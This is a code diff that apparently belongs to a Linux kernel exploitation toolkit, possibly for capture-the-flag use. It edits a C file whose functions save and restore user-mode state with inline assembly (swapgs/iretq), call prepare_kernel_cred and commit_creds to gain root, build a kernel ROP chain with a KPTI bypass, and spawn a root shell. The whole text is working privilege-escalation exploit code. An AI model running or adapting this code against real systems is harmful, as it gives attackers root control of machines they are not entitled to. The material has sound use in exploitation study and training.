@@ -2,43 +2,51 @@
 
 #include "vars.h"
 
-void win(void) {
-    char *argv[] = {"/bin/sh", NULL};
-    char *envp[] = {NULL};
-    puts("[+] win!");
-    execve("/bin/sh", argv, envp);
+void spawn_shell(void) {
+    puts("[+] returned to user land");
+    uid_t uid = getuid();
+    if (uid != 0) {
+        printf("[-] failed to get root (uid: %d)\n", uid);
+        exit(1);
+    }
+    puts("[+] got root (uid = 0)");
+    puts("[ ] spawning shell");
+    system("/bin/sh");
+    exit(0);
 }
 
 void save_state(void) {
-    asm("movq %%cs, %0\n"
-        "movq %%ss, %1\n"
-        "movq %%rsp, %2\n"
-        "pushfq\n"
-        "popq %3\n"
-        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
-        :
-        : "memory");
+    asm volatile(
+        ".intel_syntax noprefix;"
+        "mov user_cs, cs;"
+        "mov user_ss, ss;"
+        "mov user_rsp, rsp;"
+        "pushf;"
+        "pop user_rflags;"
+        ".att_syntax;");
 }
 
 // nosmep
 void restore_state(void) {
     asm volatile(
-        "swapgs ;"
-        "movq %0, 0x20(%%rsp)\t\n"
-        "movq %1, 0x18(%%rsp)\t\n"
-        "movq %2, 0x10(%%rsp)\t\n"
-        "movq %3, 0x08(%%rsp)\t\n"
-        "movq %4, 0x00(%%rsp)\t\n"
-        "iretq"
+        ".intel_syntax noprefix;"
+        "swapgs;"
+        "mov QWORD PTR [rsp + 0x20], %0;"
+        "mov QWORD PTR [rsp + 0x18], %1;"
+        "mov QWORD PTR [rsp + 0x10], %2;"
+        "mov QWORD PTR [rsp + 0x08], %3;"
+        "mov QWORD PTR [rsp + 0x00], %4;"
+        "iretq;"
+        ".att_syntax;"
         :
-        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(win));
+        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(spawn_shell));
 }
 
 // nosmep
 void escalate_privilege(void) {
     char *(*pkc)(int) = (void *)(addr_prepare_kernel_cred);
     void (*cc)(char *) = (void *)(addr_commit_creds);
-    if (addr_init_cred == DUMMY_VALUE) {
+    if (addr_init_cred == DUMMY_VALUE + kbase_offset) {
         (*cc)((*pkc)(0));
     } else {
         (*cc)((char *)addr_init_cred);
@@ -58,7 +66,7 @@ void krop(uint64_t *ptr) {
     *ptr++ = bypass_kpti;
     *ptr++ = 0xdeadbeef;
     *ptr++ = 0xcafebabe;
-    *ptr++ = (uint64_t)&win;
+    *ptr++ = (uint64_t)&spawn_shell;
     *ptr++ = user_cs;
     *ptr++ = user_rflags;
     *ptr++ = user_rsp;
